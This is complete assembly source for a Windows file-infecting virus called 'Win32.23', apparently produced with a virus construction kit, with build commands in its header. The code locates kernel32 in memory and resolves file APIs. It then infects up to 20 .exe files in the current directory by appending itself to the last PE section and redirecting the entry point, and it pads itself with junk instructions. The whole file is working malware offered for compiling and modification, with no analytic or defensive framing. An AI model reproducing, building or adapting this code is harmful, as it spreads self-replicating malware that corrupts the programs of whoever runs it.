              
;
;
; Win32.23 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.23
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 23
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 33
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
                                        ; mov ebp, edx
 push edx
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edx

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 push eax
ret



;                  [ ///// * Data * \\\\\ ]

Data:

 APINames:
 db 'CreateFileA', 0
 db 'CloseHandle', 0
 db 'GetFileAttributesA', 0
 db 'MapViewOfFile', 0
 db 'SetFileAttributesA', 0
 db 'FindClose', 0
 db 'FindNextFileA', 0
 db 'FindFirstFileA', 0
 db 'UnmapViewOfFile', 0
 db 'CreateFileMappingA', 0

 K32Trys     dd 0h
 Trash2      dd 0h
 OldEIP      dd 0h
 InfCounter  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 ATableVA    dd 0h
 FindHandle  dd 0h
 FileHandle  dd 0h
 NewSize     dd 0h
 MapAddress  dd 0h
 Trash1      dd 0h
 TempAPI     dd 0h
 Attributes  dd 0h
 counter     dw 0h
 OTableVA    dd 0h
 NTableVA    dd 0h
 NewEIP      dd 0h
 MapHandle   dd 0h
 KernelMZ    dd 0h
 AlignReg2   dd 0h
 db 'Win32.23 created by SnakeByte',0
 AlignReg1   dd 0h

 APIOffsets:
 XCreateFileA           dd 0h
 XCloseHandle           dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XSetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h

 OldBase     dd 400000h
 KernelPE    dd 0h
 filemask    db '*.exE',0




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, edi
 add esi, [edi+3Ch]
                                        ; get File Alignment
 mov ebx, [esi+3Ch]
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 add dword ptr [ebp+Trash1], ebx        ; Trash
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infect by increasing the last section
 mov esi, edx
                                        ; get last section
                                        ; clear eax
 mov eax, 0
 mov ax, word ptr [esi+06h]
 sub eax, 1
 imul eax, eax, 28h
 add edx, eax
                                        ; add edx, 120
 dec edx
 and dword ptr [ebp+Trash1], 1737259    ; Trash
 add edx, 121d
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add edx, eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], ecx
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
                                        ; clear ebx
 push 0
 pop ebx

 add ebx, [edx+10h]
                                        ; mov eax, ebx
 mov eax, ebx
 add edx, 14h
 add ebx, [edx]
 sub edx, 14h
 push ebx
 mov ecx, eax
 add ecx, [edx+0Ch]
 mov dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 mov ecx, [edx+10h]
 push ecx
                                        ; calculate new section size
 add ecx, VirusSize
 push ecx
 pop dword ptr [ebp+AlignReg1]
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], 0h
 add dword ptr [edx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [edx+08h], ecx
 adc dword ptr [ebp+Trash1], 1615900    ; Trash
 mov ecx, dword ptr [edx+0Ch]
 add ecx, dword ptr [edx+10h]
 mov dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '23'
                                        ; Append Virus
 pop edi
 mov ecx, VirusSize
 lea eax, [ebp+Virus]
 xchg eax, esi

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret
 and edx, 55759455d                     ; Trash

NoEXE:
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

 mov dword ptr [ebp+Trash1], ebx        ; Trash
 push dword ptr [ebp+OldBase]
 pop esi

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], esi


                                        ; get Kernel by using hardcoded values
 mov ecx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov ecx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov ecx, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear esi
 push 0
 pop esi

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[esi]
 mov edx, offset GetKernel32Exception
 add edx, ebp

 push edx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 72761
 sub dword ptr [ebp+K32Trys], 2761d

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz GetKernel32NotFound
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 add ecx, -65536d
 mov eax, dword ptr [ebp+K32Trys]
 dec eax
 mov dword ptr [ebp+K32Trys], -1
 and dword ptr [ebp+K32Trys], eax
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ecx, 60
 dec ecx
 add ecx, 61d
 mov edx, [ecx]
 inc ecx
 sub ecx, 61d
 xchg edx, ecx
 add ecx, edx
 xchg edx, ecx
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
 or eax, ecx                            ; Trash
                                        ; check if the file is a DLL
                                        ; add edx, 22
 inc edx
 add edx, 21d
                                        ; clear ebx
 mov ebx, 0
 movzx ebx, word ptr [edx]
 and bx, 0F000h
 cmp bx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
                                        ; mov eax, 22
 mov eax, ( 22d xor 4d )
 xor eax, 4d
 sub edx, eax


KernelFound:
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], edx

                                        ; clear esi
 xor esi, esi

 pop dword ptr fs:[esi]
 xor ecx, edx                           ; Trash
 pop eax
 shr ebx, 19d                           ; Trash
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ecx
 sub ecx, ecx

 mov ebx, dword ptr fs:[ecx]
 mov esp, dword ptr [ebx]
GetKernel32NotFound:
                                        ; clear ebx
 sub ebx, ebx

 pop dword ptr fs:[ebx]
 pop edx
 popad
 stc
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ecx
 and ecx, 0
 add ecx, NumberOfApis
 mov edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov eax, [edi+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 add eax, 28d
                                        ; get ATableVA
 mov edi, dword ptr [eax]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; add eax, 4
 add eax, 4d
                                        ; get NTableVA
 mov edi, dword ptr [eax]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; add eax, 4
 dec eax
 add eax, 5d
                                        ; get OTableVA
 mov edi, dword ptr [eax]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; load API Names and Offsets
 lea esi, [ebp+APIOffsets]
 xchg esi, edx

 lea edi, [ebp+APINames]


GetApisLoop: 

 mov eax, edi
APINameDetect:                          ; calculate the lenght of the names
 inc eax
 cmp byte ptr [eax], 0
 jne APINameDetect
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 push eax
 sub dword ptr [esp], edi
 pop eax
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; edi points to the Name
                                        ; edx points to the offset

 call SearchAPI1
 push edi
 add dword ptr [esp], eax
 pop edi
                                        ; add edi, 1
 add edi, 1d
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], 0
 add dword ptr [edx], ebx
                                        ; add edx, 4
 inc edx
 add edx, 3d
 sub ecx, 1
 jnz GetApisLoop
 lea ecx, [ebp+Outbreak]
 xchg ecx, eax

 push eax
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea esi, [ebp+WFD_szFileName]
 xchg ebx, esi

 push ebx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
 push ecx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
                                        ; get and remove file attributes
 mov eax, offset WFD_szFileName
 add eax, ebp

 push eax
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 mov ecx, ( 128d + 16d )
 sub ecx, 16d
 push ecx
 mov ecx, offset WFD_szFileName
 add ecx, ebp


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 cmp eax, 0
 je NoInfection
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]
 xchg edx, eax

 cmp dword ptr [eax], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],esi
 jb Notagoodfile
 add esi, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
                                        ; clear edx
 push 0
 pop edx
 test edx, edx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '23'
 jz Notagoodfile
                                        ; check for OBJ
 mov cx, word ptr [esi+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+Attributes]
 push ebx
 mov edx, offset WFD_szFileName
 add edx, ebp

 push edx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
                                        ; mov edx, ebx
 mov edx, ebx
                                        ; mov esi, edx
 push edx
 pop esi
 push eax
 push esi
 push edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bl, byte ptr [edi]
 cmp bl, byte ptr [esi]
 jne ApiNotFound
 dec eax
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz FoundApi1
                                        ; add edi, 1
 inc edi
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop esi
 pop eax
 pop edx
                                        ; add edx, 4
 add edx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 16d
 rcl ecx, 17d                           ; Trash
                                        ; retrieve the offset
                                        ; clear ecx
 mov ecx, 22966d
 sub ecx, 22966d
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 push ecx
 pop esi
 movzx ecx, word ptr [esi]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ecx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea edx, [ebp+filemask]
 xchg edx, ebx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ecx, edx

 push ecx
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA

 push esi
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea eax, [ebp+WFD_szFileName]
 xchg ebx, eax

                                        ; mov ecx, 276
 mov ecx, ( 276d xor 14d )
 xor ecx, 14d

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec ecx
 jnz ClearOldData2
 popad
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 sub edx, edx
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 add eax, 1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

